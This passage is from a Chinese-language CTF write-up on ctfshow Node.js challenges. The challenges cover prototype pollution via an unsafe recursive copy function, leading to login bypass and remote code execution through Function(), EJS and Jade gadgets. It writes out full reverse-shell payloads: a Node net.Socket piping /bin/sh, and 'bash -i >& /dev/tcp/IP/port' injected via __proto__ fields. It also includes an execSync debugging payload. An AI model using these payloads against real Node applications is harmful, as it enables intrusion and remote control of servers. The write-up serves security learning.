install</p><p>node bin/www</p></blockquote><p>index.js：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; title: <span class="hljs-string">&#x27;Express&#x27;</span> &#125;);<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>login.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user,req.body);<br>  <span class="hljs-keyword">if</span>(secert.ctfshow===<span class="hljs-string">&#x27;36dboy&#x27;</span>)&#123;<br>    res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123;ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;登录失败&#x27;</span>+JSON.stringify(user)&#125;);  <br>  &#125;<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>common.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">module.exports = &#123;<br>  copy:copy<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copy</span>(<span class="hljs-params">object1, object2</span>)</span>&#123;<br>    <span class="hljs-keyword">for</span> (let key in object2) &#123;<br>        <span class="hljs-keyword">if</span> (key in object2 &amp;&amp; key in object1) &#123;<br>            copy(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>首页貌似没啥用，在login.js中看到secert没有ctfshow这个属性，而<code>secert.ctfshow===&#39;36dboy&#39;</code>就有flag，我们发现select是一个数组，而user也是一个数组(具有同型)，而且通过<code>utils.copy(user,req.body)</code>传入数值(copy和merge类比)，req.body是POST请求(参数可控)</p><p>那么抓包传入即可</p><blockquote><p>{“__proto__“:{“ctfshow”:”36dboy”}}</p></blockquote><h4 id="ctfshow339"><a href="#ctfshow339" class="headerlink" title="ctfshow339"></a>ctfshow339</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user, req.body);<br>  <span class="hljs-keyword">if</span> (secert.ctfshow === flag) &#123;<br>    res.end(flag);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123; ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;登录失败&#x27;</span> + JSON.stringify(user) &#125;);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>和338不同的是ctfshow===变量，我们可知最后的32位字符串就在这变量flag，是不可预测的值；多了一个api.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;api&#x27;</span>, &#123; query: <span class="hljs-function"><span class="hljs-keyword">Function</span>(<span class="hljs-params">query</span>)(<span class="hljs-params">query</span>)&#125;)</span>;   <br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>然后我们污染点一样，仍然是</p><blockquote><p>  let user = {};<br>  utils.copy(user,req.body);</p></blockquote><p>触发点：</p><blockquote><p>res.render(‘api’, { query: Function(query)(query)}); </p></blockquote><p>匿名函数，和Code-Breaking Thejs很相像</p><blockquote><p>Function(query)(query)这种匿名函数的写法，query不再是传数值，而是传入执行代码，然后自执行。有点和eval类似，但这里更好的解释是Function对象</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p><p>官方是这样定义的：<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的  JavaScript 函数。</p></blockquote><p>然后想法是通过login.js的copy污染到api.js的query，反弹一个shell</p><p>js如何反弹shell<a href="https://xz.aliyun.com/t/7184">https://xz.aliyun.com/t/7184</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//js原生socket建立连接</span><br><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, [])<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(监听端口, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br><span class="hljs-comment">//污染传入</span><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//拼接</span><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = require(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = require(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(监听端口, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要对上面的代码”格式化“，payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(监听端口, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>传入拼接完成的payload，post传至/login，接着访问/api触发后无响应，检查发现隧道启动成功，但是没有任何连接</p><p>解释如下：</p><ul><li>Function中require是模块内的，无法调用全局变量</li></ul><p><a href="https://github.com/nodejs/node-v0.x-archive/issues/2017">https://github.com/nodejs/node-v0.x-archive/issues/2017</a>  </p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211121223733792.png"></p><ul><li>因为 node 是基于 chrome v8 内核的，运行时，压根就不会有 <code>require</code> 这种关键字，模块加载不进来，自然 shell 就反弹不了了。但在 node交互环境，或者写 js 文件时，通过 node 运行会自动把 <code>require</code> 进行编译。</li></ul><p><a href="https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js">https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js</a> </p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211122000430212.png"></p><p><a href="https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing">https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing</a></p><p>此处的匿名函数原型是通过<code>new Function()</code>创建而来的，也就是说等价于上面的截图情形，没法直接在<code>Function</code>中引入 <code>require</code></p><p>总结就是，使用的是nodejs搭建的服务，可以使用require，但它无法在匿名函数内调用全局变量(http)，换一种写法</p><blockquote><p>var require = global.require || global.process.mainModule.constructor._load</p></blockquote><p>同时对于这个问题，我们看到nodejs是面向服务器端的，它具有require关键字，但在浏览器的控制台是没有的</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, []);<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(监听端口, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(监听端口, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(监听端口, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;query&quot;</span>:<span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>如果是 windows 系统就把 <code>/bin/sh</code> 换成 <code>cmd.exe</code> 就可以了</p><h4 id="ctfshow-340"><a href="#ctfshow-340" class="headerlink" title="ctfshow 340"></a>ctfshow 340</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.userinfo = <span class="hljs-keyword">new</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-built_in">this</span>.isVIP = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.isAdmin = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.isAuthor = <span class="hljs-literal">false</span>;     <br>    &#125;;<br>  &#125;<br>  utils.copy(user.userinfo,req.body);<br>  <span class="hljs-keyword">if</span>(user.userinfo.isAdmin)&#123;<br>   res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-keyword">return</span> res.json(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span>&#125;); <br>  &#125;<br>&#125;);<br><span class="hljs-built_in">module</span>.exports = router;<br></code></pre></td></tr></table></figure><p>这里面的userinfo原型不同了</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211122183340194.png"></p><p>再套一个<code>__proto__</code>即可</p><h4 id="ctfshow-341"><a href="#ctfshow-341" class="headerlink" title="ctfshow 341"></a>ctfshow 341</h4><p>这里介绍两个自动化找洞：</p><p>snyk的使用</p><p>在官网注册登录，初次登录要关联Github，找到api，本地：</p><blockquote><p>npm install snyk -g </p><p>snyk config set api=</p><p>snyk test</p></blockquote><p>audit的使用</p><blockquote><p>npm audit</p></blockquote><ul><li>ejs</li></ul><p>因为这题没有/api触发点，使用338存在的ejs RCE，因为是非预期没有放出来，使用snyk扫出来</p><p><a href="https://security.snyk.io/vuln/SNYK-JS-EJS-1049328">https://security.snyk.io/vuln/SNYK-JS-EJS-1049328</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;filename&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1&quot;</span>&#x27;);var __tmp2<span class="hljs-string">&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>还有一个入口outputFunctionName：<a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>注意到login.js的<code>this.userinfo = new function()&#123;...</code>所以上面的payload再嵌套一个<code>__proto__</code></p><h4 id="ctfshow342、343"><a href="#ctfshow342、343" class="headerlink" title="ctfshow342、343"></a>ctfshow342、343</h4><ul><li>jade</li></ul><p><a href="https://xz.aliyun.com/t/7025#toc-2">https://xz.aliyun.com/t/7025#toc-2</a></p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172124317.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172422442.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172602483.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172725768.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124173907879.png"></p><p>js调试真的一坨坨的Orz</p><p>this.engine跟进</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124174739562.png"></p><p>继续跟进</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124174952093.png"></p><p>可见返回值处：</p><blockquote><p>return handleTemplateCache(options)(options);</p></blockquote><p>跟进一下handleTemplateCache</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125001447005.png"></p><p>跟一下compile<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125001503138.png"></p><p>先看一下parse</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125003052754.png"></p><p>parser内，tokens被内部parse后传到compiler被compile，赋为js的值，js被部分传入body内</p><p>看一下compile，它是compiler的函数，去node_module找</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125003818514.png"></p><p>返回buf传回compile</p><p>跟进66行this.visit(this.node);<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125082102153.png"></p><p>this.debug=true时node.filename被stringify转换为字符串 node.line随着被push进buf</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125082655288.png"></p><p>this.visitNode(node);遍历ast树后回到compile<img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125084259360.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125084511998.png"></p><p>node.line被记录到fn中，然后</p><blockquote><p>fn = new Function(‘locals, jade’, fn);</p></blockquote><p>那么我们的污染点就出来了，<strong>污染到node.line就可以运行代码了</strong></p><h5 id="碰到问题"><a href="#碰到问题" class="headerlink" title="碰到问题"></a>碰到问题</h5><p>post /login</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;line&quot;</span>:<span class="hljs-string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>监视node.line值</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126173326438.png"></p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126173359572.png"></p><p>或者<code>Uncaught ReferenceError: node is not defined</code>，说明node.line存在原始的值，它不会去Object找污染的值</p><p>重新梳理一下调用栈</p><blockquote><p>res.render-&gt;app.render-&gt;tryRender-&gt;view.render-&gt;this.engine</p><ol><li>app.js :: res.render</li><li>jade/lib/index.js :: exports.__express</li><li>jade/lib/index.js :: exports.renderFile<ol><li>jade/lib/index.js :: handleTemplateCache</li></ol></li><li>jade/lib/index.js :: exports.compile<ol><li>jade/lib/index.js :: parse -&gt; compiler.compile();<ol><li>jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node)</li><li>jade/lib/compiler.js :: this.visit</li><li>jade/lib/compiler.js :: this.buf.push</li></ol></li><li>jade/lib/index.js :: parse -&gt; options.self</li><li>jade/lib/index.js :: fn = new Function(‘locals, jade’, fn)</li><li>jade/lib/index.js :: fn(locals, Object.create(runtime))</li></ol></li></ol></blockquote><p>进入app.render后可以看到获取了options，触发app渲染引擎进行渲染</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125170700643.png"></p><p>系列参数设置继续步过，进入tryRender</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173138254.png"></p><p>可以看到，寻找到app的渲染引擎，并且设置为jade，开始渲染</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173338485.png"></p><p>this.engine进入jade库</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173430135.png"></p><p>回到node.line打一下看看</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126174150498.png"></p><blockquote><p>TypeError: this[(“visit” + node.type)] is not a function</p></blockquote><p>找到Compiler.visitNode，打个断点</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126174434191.png"></p><p>拼接发现没有这个方法，遍历ast树，通常是通过“visit+节点类型”来遍历所有节点的，观察光标，按照他的默认值设置为Block</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126183747677.png"></p><p>节点类型不合要求，测试所有节点类型如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">visitAttributes</span><br>visitEach<br>visitCode √<br>visitBlockComment√<br>visitComment√<br>visitText<br>visitFilter<br>visitTag<br>visitMixin<br>visitDoctype√<br>visitMixinBlock√<br>visitBlock<br>visitLiteral<br>visitWhen<br>visitCase<br>visitNode<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126184235129.png"></p><blockquote><p>TypeError: plugin is not a function</p></blockquote><p>看报错还没有完成渲染，找到jade渲染完前的最后报错</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126212401866.png"></p><p>是一个判断，打进去的时候self是undefined，可以污染</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126231450129.png"></p><p>污染title</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126231900595.png"></p><p>污染message</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126232004589.png"></p><p>污染error，一开始传了一个1，传json格式的内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">,<span class="hljs-string">&quot;error&quot;</span>:&#123;<span class="hljs-attr">&quot;status&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-attr">&quot;stack&quot;</span>:<span 